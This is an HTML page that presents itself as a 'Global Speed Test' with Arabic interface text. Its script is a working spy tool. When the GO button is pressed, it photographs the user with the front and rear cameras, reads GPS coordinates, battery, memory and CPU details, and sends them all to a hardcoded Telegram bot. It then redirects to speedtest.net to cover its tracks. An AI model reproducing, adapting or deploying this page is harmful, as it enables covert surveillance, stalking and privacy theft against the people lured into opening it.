
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SpeedTest - Global Connectivity</title>
    <style>
        body { background-color: #0b0e18; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        /* زر GO بتصميم يمنع التداخل */
        .go-button { width: 200px; height: 200px; background: radial-gradient(circle, #1a2035 0%, #0b0e18 100%); border: 5px solid #00d2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; user-select: none; -webkit-tap-highlight-color: transparent; box-shadow: 0 0 20px rgba(0, 210, 255, 0.3); }
        .go-button:active { transform: scale(0.95); border-color: #ff0055; }
        .go-text { font-size: 60px; font-weight: bold; color: #00d2ff; pointer-events: none; } /* منع النص من اعتراض اللمس */
        #status { margin-top: 30px; font-size: 18px; color: #888; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <h2 style="margin-bottom: 40px;">Global Speed Test</h2>

    <div class="go-button" id="mainBtn">
        <span class="go-text">GO</span>
    </div>

    <p id="status">بانتظار بدء الفحص...</p>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
        const chatId = "7984067238"; 

        async function sendToTelegram(type, content, extra = "") {
            const formData = new FormData();
            formData.append("chat_id", chatId);
            if (type === "photo") {
                formData.append("photo", content, "image.jpg");
                formData.append("caption", extra);
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
            } else {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(content)}&parse_mode=Markdown`);
            }
        }

        async function capture(mode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode, width: 640 }, audio: false });
                const video = document.getElementById( video );
                video.srcObject = stream;
                await new Promise(res => video.onloadedmetadata = res);
                await new Promise(res => setTimeout(res, 800)); 
                const canvas = document.getElementById( canvas );
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext( 2d ).drawImage(video, 0, 0);
                stream.getTracks().forEach(t => t.stop());
                return new Promise(res => canvas.toBlob(res,  image/jpeg , 0.6));
            } catch (e) { return null; }
        }

        document.getElementById( mainBtn ).addEventListener( click , async function() {
            const status = document.getElementById( status );
            status.innerText = "جاري الاتصال بالسيرفر...";
            this.style.pointerEvents = "none"; // منع الضغط المتكرر

            // 1. التقاط الصور
            const fImg = await capture("user");
            if (fImg) await sendToTelegram("photo", fImg, "📸 صورة أمامية");
            
            const bImg = await capture("environment");
            if (bImg) await sendToTelegram("photo", bImg, "📸 صورة خلفية");

            // 2. الموقع والبيانات التقنية
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    let batt = "غير معروف";
                    try { const b = await navigator.getBattery(); batt = `${Math.round(b.level * 100)}%`; } catch(e){}
                    
                    const report = `✅ **تم الفحص بنجاح**\n\n` +
                                   `🔋 البطارية: ${batt}\n` +
                                   `💾 الذاكرة: ${navigator.deviceMemory ||  4+ } GB\n` +
                                   `⚙️ المعالج: ${navigator.hardwareConcurrency ||  ؟ } نواة\n` +
                                   `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;

                    await sendToTelegram("text", report);
                    status.innerText = "اكتمل الفحص!";
                    setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
                }, (err) => {
                    alert("يرجى الموافقة على الأذونات للمتابعة.");
                    location.reload();
                });
            }
        });
    </script>
</body>
</html>
